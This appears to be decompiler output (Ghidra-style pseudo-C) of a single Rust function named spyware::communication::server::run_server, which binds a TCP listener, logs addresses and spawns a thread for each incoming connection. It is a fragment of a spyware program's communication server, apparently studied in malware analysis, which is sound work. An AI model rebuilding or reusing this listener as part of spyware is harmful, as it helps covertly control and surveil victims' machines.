code * _ZN7spyware13communication6server10run_server17hf575f6adb91dbfb6E(undefined2 param_1)

{
  code *pcVar1;
  undefined *puVar2;
  undefined8 ****ppppuVar3;
  long lVar4;
  ulong uVar5;
  int local_114;
  int local_110;
  undefined2 local_10a;
  undefined8 *****local_108;
  undefined8 ****local_100;
  undefined8 local_f8;
  undefined8 uStack_f0;
  undefined8 local_e8;
  undefined8 ****local_e0;
  undefined8 local_d8;
  code *local_d0;
  undefined8 *****local_c8;
  undefined8 local_c0;
  undefined8 local_b8;
  undefined local_b0;
  undefined8 local_a8;
  undefined8 *****local_a0;
  undefined8 *****local_98;
  undefined8 ****ppppuStack_90;
  undefined4 local_88;
  undefined4 uStack_84;
  undefined4 uStack_80;
  undefined4 uStack_7c;
  undefined8 *****local_78;
  undefined8 ****ppppuStack_70;
  undefined4 local_68;
  undefined4 uStack_64;
  undefined4 uStack_60;
  undefined4 uStack_5c;
  undefined4 local_58;
  undefined4 uStack_54;
  undefined4 uStack_50;
  undefined4 uStack_4c;
  undefined local_48 [24];
  
  local_108 = (undefined8 *****)&PTR_DAT_001b8d10;
  local_100 = (undefined8 ****)
              _ZN44__LT__RF_T_u20_as_u20_core__fmt__Display_GT_3fmt17h412b806372427b66E;
  local_f8 = &local_10a;
  uStack_f0 = 
  PTR__ZN4core3fmt3num3imp52__LT_impl_u20_core__fmt__Display_u20_for_u20_u16_GT_3fmt17hca7847b10460df25E_001be650
  ;
  local_d8 = (undefined **)&DAT_001b8ca0;
  local_d0 = (code *)0x2;
  local_b8 = 0;
  local_c8 = &local_108;
  local_c0 = 2;
  local_10a = param_1;
  _ZN4core6option15Option_LT_T_GT_11map_or_else17h31b26472792d6da3E(local_48,&local_d8);
  _ZN3std3net3tcp11TcpListener4bind17he40e587fcbf7a57cE(&local_d8,local_48);
  if (((ulong)local_d8 & 1) != 0) {
    return local_d0;
  }
  local_110 = local_d8._4_4_;
                    /* try { // try from 0014d110 to 0014d125 has its CatchHandler @ 0014d56d */
  (*(code *)PTR__ZN3std3net3udp9UdpSocket10local_addr17h11cfe5222b964dfcE_001be658)
            (&local_78,&local_110);
  if ((short)local_78 == 2) {
    local_e0 = ppppuStack_70;
    lVar4 = _ZN4core4sync6atomic11atomic_load17h8c88032dab18ab12E();
    if (lVar4 != 0) {
      local_a8 = (undefined8 ******)&local_e0;
      local_98 = (undefined8 *****)&local_a8;
      ppppuStack_90 =
           (undefined8 ****)
           _ZN44__LT__RF_T_u20_as_u20_core__fmt__Display_GT_3fmt17h2d488762f4f56181E;
      local_d8 = &PTR_DAT_001b8cd0;
      local_d0 = (code *)0x2;
      local_b8 = 0;
      local_c8 = &local_98;
      local_c0 = 1;
                    /* try { // try from 0014d1aa to 0014d1f2 has its CatchHandler @ 0014d55e */
      local_e8 = (*(code *)PTR__ZN3log13__private_api3loc17he75f2f86c1ff97b9E_001be620)
                           (&PTR_DAT_001b8d38);
      local_108 = (undefined8 *****)&DAT_001120dc;
      local_100 = (undefined8 *****)0x1e;
      local_f8 = (undefined2 *)&DAT_001120dc;
      uStack_f0 = (undefined *)0x1e;
      _ZN3log13__private_api3log17h13afddf373bd7d7fE(&local_d8,1,&local_108);
    }
                    /* try { // try from 0014d1f3 to 0014d2c3 has its CatchHandler @ 0014d56d */
    _ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h2ffe2f512d0f1687E(&local_e0);
  }
  else {
    local_88 = local_68;
    uStack_84 = uStack_64;
    uStack_80 = uStack_60;
    uStack_7c = uStack_5c;
    local_98 = local_78;
    ppppuStack_90 = ppppuStack_70;
    uVar5 = _ZN4core4sync6atomic11atomic_load17h8c88032dab18ab12E();
    if (2 < uVar5) {
      local_a8 = &local_98;
      local_a0 = (undefined8 *****)
                 PTR__ZN71__LT_core__net__socket_addr__SocketAddr_u20_as_u20_core__fmt__Debug_GT_3fmt17h5869d6b0d96760beE_001be660
      ;
      local_d8 = &PTR_DAT_001b8cc0;
      local_d0 = (code *)&DAT_00000001;
      local_b8 = 0;
      local_c8 = (undefined8 *****)&local_a8;
      local_c0 = 1;
      local_e8 = (*(code *)PTR__ZN3log13__private_api3loc17he75f2f86c1ff97b9E_001be620)
                           (&PTR_DAT_001b8d20);
      local_108 = (undefined8 *****)&DAT_001120dc;
      local_100 = (undefined8 *****)0x1e;
      local_f8 = (undefined2 *)&DAT_001120dc;
      uStack_f0 = (undefined *)0x1e;
      _ZN3log13__private_api3log17h13afddf373bd7d7fE(&local_d8,3,&local_108);
    }
  }
  puVar2 = 
  PTR__ZN82__LT_std__net__tcp__Incoming_u20_as_u20_core__iter__traits__iterator__Iterator_GT_4next17hd0d557571d3ab98dE_001be668
  ;
  local_e0 = (undefined8 ****)&local_110;
  while( true ) {
    while( true ) {
      (*(code *)puVar2)(&local_a8,&local_e0);
      if ((int)local_a8 != 0) break;
      local_114 = local_a8._4_4_;
      uVar5 = _ZN4core4sync6atomic11atomic_load17h8c88032dab18ab12E();
      if (2 < uVar5) {
                    /* try { // try from 0014d3e7 to 0014d4d2 has its CatchHandler @ 0014d587 */
        (*(code *)PTR__ZN3std3net3tcp9TcpStream9peer_addr17h9ccf6949693ba95cE_001be628)
                  (&local_108,&local_114);
        ppppuVar3 = local_100;
        if ((short)local_108 == 2) {
          _ZN4core3ptr45drop_in_place_LT_std__net__tcp__TcpStream_GT_17hf7372bfdd8ef8cfeE(local_114)
          ;
          _ZN4core3ptr45drop_in_place_LT_std__net__tcp__TcpStream_GT_17hf7372bfdd8ef8cfeE(local_110)
          ;
          return (code *)(undefined8 *****)ppppuVar3;
        }
        local_58 = (undefined4)local_f8;
        uStack_54 = local_f8._4_4_;
        uStack_50 = (undefined4)uStack_f0;
        uStack_4c = uStack_f0._4_4_;
        local_98 = local_108;
        ppppuStack_90 = local_100;
        local_88 = (undefined4)local_f8;
        uStack_84 = local_f8._4_4_;
        uStack_80 = (undefined4)uStack_f0;
        uStack_7c = uStack_f0._4_4_;
        local_78 = &local_98;
        ppppuStack_70 =
             (undefined8 ****)
             PTR__ZN73__LT_core__net__socket_addr__SocketAddr_u20_as_u20_core__fmt__Display_GT_3fmt17hb8f0b665671134daE_001be630
        ;
        local_d8 = &PTR_DAT_001b8cf0;
        local_d0 = (code *)&DAT_00000001;
        local_b8 = 0;
        local_c8 = &local_78;
        local_c0 = 1;
        local_e8 = (*(code *)PTR__ZN3log13__private_api3loc17he75f2f86c1ff97b9E_001be620)
                             (&PTR_DAT_001b8d68);
        local_108 = (undefined8 *****)&DAT_001120dc;
        local_100 = (undefined8 *****)0x1e;
        local_f8 = (undefined2 *)&DAT_001120dc;
        uStack_f0 = (undefined *)0x1e;
        _ZN3log13__private_api3log17h13afddf373bd7d7fE(&local_d8,3,&local_108);
      }
      local_c8 = (undefined8 ******)0x8000000000000000;
      local_d8 = (undefined **)0x0;
      local_b0 = 0;
                    /* try { // try from 0014d4f4 to 0014d511 has its CatchHandler @ 0014d5a4 */
      _ZN3std6thread7Builder15spawn_unchecked17h25f5435683f80577E(&local_108,&local_d8,local_114);
      _ZN4core6result19Result_LT_T_C_E_GT_6expect17h3c826feadda953dbE(&local_d8,&local_108);
      _ZN4core3ptr112drop_in_place_LT_std__thread__JoinHandle_LT_core__result__Result_LT__LP__RP__C_std__io__error__Error_GT__GT__GT_17hc1f2d39e06124517E
                (&local_d8);
    }
    if ((int)local_a8 != 1) break;
    local_78 = local_a0;
    lVar4 = _ZN4core4sync6atomic11atomic_load17h8c88032dab18ab12E();
    if (lVar4 != 0) {
      local_98 = &local_78;
      ppppuStack_90 =
           (undefined8 ****)
           PTR__ZN60__LT_std__io__error__Error_u20_as_u20_core__fmt__Display_GT_3fmt17hcf0c0103019d8a0aE_001be638
      ;
      local_d8 = &PTR_DAT_001b8d00;
      local_d0 = (code *)&DAT_00000001;
      local_b8 = 0;
      local_c8 = &local_98;
      local_c0 = 1;
                    /* try { // try from 0014d384 to 0014d3c1 has its CatchHandler @ 0014d56f */
      local_e8 = (*(code *)PTR__ZN3log13__private_api3loc17he75f2f86c1ff97b9E_001be620)
                           (&PTR_DAT_001b8d98);
      local_108 = (undefined8 *****)&DAT_001120dc;
      local_100 = (undefined8 *****)0x1e;
      local_f8 = (undefined2 *)&DAT_001120dc;
      uStack_f0 = (undefined *)0x1e;
      _ZN3log13__private_api3log17h13afddf373bd7d7fE(&local_d8,1,&local_108);
    }
                    /* try { // try from 0014d2f0 to 0014d304 has its CatchHandler @ 0014d5a6 */
    _ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h2ffe2f512d0f1687E(&local_78);
  }
                    /* try { // try from 0014d543 to 0014d55b has its CatchHandler @ 0014d56d */
  (*(code *)PTR__ZN3std9panicking11begin_panic17hb01f6b74cc5cddb3E_001be670)
            (&DAT_00112250,0x1a,&PTR_DAT_001b8d50);
                    /* WARNING: Does not return */
  pcVar1 = (code *)invalidInstructionException();
  (*pcVar1)();
}